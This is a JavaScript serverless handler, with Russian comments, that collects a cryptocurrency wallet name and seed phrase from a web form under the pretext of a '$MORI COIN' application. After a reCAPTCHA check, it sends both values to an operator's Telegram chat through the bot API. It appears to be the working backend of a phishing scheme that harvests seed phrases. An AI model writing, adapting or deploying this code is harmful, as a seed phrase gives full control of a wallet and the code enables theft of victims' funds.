const axios = require('axios');

function sanitizeText(text) {
    if (typeof text !== 'string') return '';
    return text.replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

exports.handler = async function (event) {
    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            body: JSON.stringify({ message: 'Метод не разрешен' }),
        };
    }

    try {
        const { BOT_TOKEN, CHAT_ID, RECAPTCHA_SECRET_KEY } = process.env;
        const body = JSON.parse(event.body);
        const { walletName, seedPhrase, recaptchaToken } = body;

        // --- ПРОВЕРКА RECAPTCHA ---
        if (!recaptchaToken) {
           throw new Error("Токен reCAPTCHA отсутствует.");
        }

        const recaptchaUrl = `https://www.google.com/recaptcha/api/siteverify`;
        const recaptchaRes = await axios.post(recaptchaUrl, null, {
            params: {
                secret: RECAPTCHA_SECRET_KEY,
                response: recaptchaToken,
            },
        });
        
        // Проверяем, что проверка успешна и оценка пользователя выше порога (0.5 - стандарт)
        if (!recaptchaRes.data.success || recaptchaRes.data.score < 0.5) {
            console.warn("Проверка reCAPTCHA не пройдена!", recaptchaRes.data);
            throw new Error("Вы не прошли проверку на робота.");
        }
        // --- КОНЕЦ ПРОВЕРКИ ---


        if (!BOT_TOKEN || !CHAT_ID) {
            console.error("КРИТИЧЕСКАЯ ОШИБКА: BOT_TOKEN или CHAT_ID не установлены!");
            throw new Error("Конфигурация сервера не завершена.");
        }
        
        if (!walletName || !seedPhrase) {
            return {
                statusCode: 400,
                body: JSON.stringify({ success: false, message: 'Отсутствуют необходимые данные.' }),
            };
        }

        const sanitizedWallet = sanitizeText(walletName);
        const sanitizedPhrase = sanitizeText(seedPhrase);

        const message = `Новая заявка на $MORI COIN:
Кошелёк: ${sanitizedWallet}
Сид фраза: ${sanitizedPhrase}`;
        
        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

        await axios.post(telegramUrl, {
            chat_id: CHAT_ID,
            text: message,
        });

        return {
            statusCode: 200,
            body: JSON.stringify({ success: true, message: 'Заявка успешно отправлена!' }),
        };

    } catch (error) {
        console.error('Ошибка внутри выполнения функции:', error.message);
        return {
            statusCode: 500,
            body: JSON.stringify({ success: false, message: error.message || 'Произошла внутренняя ошибка на сервере.' }),
        };
    }
};